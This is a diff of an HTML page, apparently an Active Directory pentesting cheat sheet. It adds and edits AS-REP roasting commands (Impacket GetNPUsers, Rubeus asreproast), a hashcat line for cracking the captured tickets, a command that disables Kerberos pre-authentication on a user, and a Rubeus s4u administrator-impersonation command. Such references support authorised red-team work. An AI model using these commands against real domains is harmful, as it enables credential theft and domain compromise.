@@ -1142,17 +1142,22 @@ python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span 
 <span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">DoesNotRequirePreAuth</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">DoesNotRequirePreAuth</span>
 </code></pre></div>
 <p>Enumerate accounts  with Kerberos pre-authentication disabled and dump TGS with Impacket's <code>GetNPUsers</code>:</p>
-<div class="highlight"><pre><span></span><code>GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>-usersfile<span class="w"> </span>&lt;list<span class="w"> </span>of<span class="w"> </span>users&gt;<span class="w"> </span>e&lt;domain&gt;/<span class="w"> </span>
+<div class="highlight"><pre><span></span><code>GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>&lt;domain&gt;/&lt;user&gt;
+
+GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>-usersfile<span class="w"> </span>&lt;list<span class="w"> </span>of<span class="w"> </span>users&gt;<span class="w"> </span>&lt;domain&gt;/<span class="w"> </span>
 </code></pre></div>
 <p>Force disabling Kerberos pre-authentication for a user on which the attacker's controlled user has <code>GenericAll</code> or <code>GenericWrite</code> permissions:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">Control1User</span> <span class="n">-XOR</span> <span class="p">@{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="n">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
 </code></pre></div>
 <p>Request TGS for vulnerable users:</p>
 <div class="highlight"><pre><span></span><code>#<span class="w"> </span><span class="k">For</span><span class="w"> </span><span class="nv">every</span><span class="w"> </span><span class="nv">vulnerable</span><span class="w"> </span><span class="nv">user</span><span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">current</span><span class="w"> </span><span class="nv">domain</span>
-<span class="nv">Rubeus</span>.<span class="nv">exe</span><span class="w"> </span><span class="nv">asreproast</span>
+<span class="nv">Rubeus</span>.<span class="nv">exe</span><span class="w"> </span><span class="nv">asreproast</span><span class="w"> </span><span class="o">/</span><span class="nv">nowrap</span>
 
 #<span class="w"> </span><span class="k">For</span><span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="nv">specific</span><span class="w"> </span><span class="nv">user</span>
-<span class="nv">Rubeus</span>.<span class="nv">exe</span><span class="w"> </span><span class="nv">asreproast</span><span class="w"> </span><span class="o">/</span><span class="nv">user</span>:<span class="o">&lt;</span><span class="nv">target</span><span class="w"> </span><span class="nv">user</span><span class="o">&gt;</span>
+<span class="nv">Rubeus</span>.<span class="nv">exe</span><span class="w"> </span><span class="nv">asreproast</span><span class="w"> </span><span class="o">/</span><span class="nv">user</span>:<span class="o">&lt;</span><span class="nv">target</span><span class="w"> </span><span class="nv">user</span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="nv">nowrap</span>
+</code></pre></div>
+<p>Crack ticket with hashcat:</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>&lt;ticket&gt;<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </code></pre></div>
 <h3 id="kerberos-delegation">Kerberos Delegation</h3>
 <h4 id="unconstrained-delegation">Unconstrained Delegation</h4>
@@ -1196,7 +1201,7 @@ tgs::s4u<span class="w"> </span>/tgt:&lt;kirbi<span class="w"> </span>ticket<spa
 Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/ticket:&lt;base64<span class="w"> </span>tgt<span class="p">|</span>kirbi<span class="w"> </span>ticket<span class="w"> </span>file<span class="w"> </span>path&gt;<span class="w"> </span>/impersonateuser:administrator<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/msdsspn:&lt;target<span class="w"> </span>SPN&gt;<span class="w"> </span>/dc:&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>/ptt
 </code></pre></div>
 <h4 id="ms-rprn-abuse-printer-bug">MS-RPRN abuse (Printer Bug)</h4>
-<p>Check if spooler service is enable on remote targets using <a href="https://github.com/vletoux/SpoolerScanner">SpoolerScanner</a>:</p>
+<p>Check if spooler service is enabled on remote targets using <a href="https://github.com/vletoux/SpoolerScanner">SpoolerScanner</a>:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Get-SpoolStatus</span><span class="p">.</span><span class="n">ps1</span>
 <span class="nb">Get-SpoolStatus</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">server</span><span class="p">&gt;</span>
 </code></pre></div>
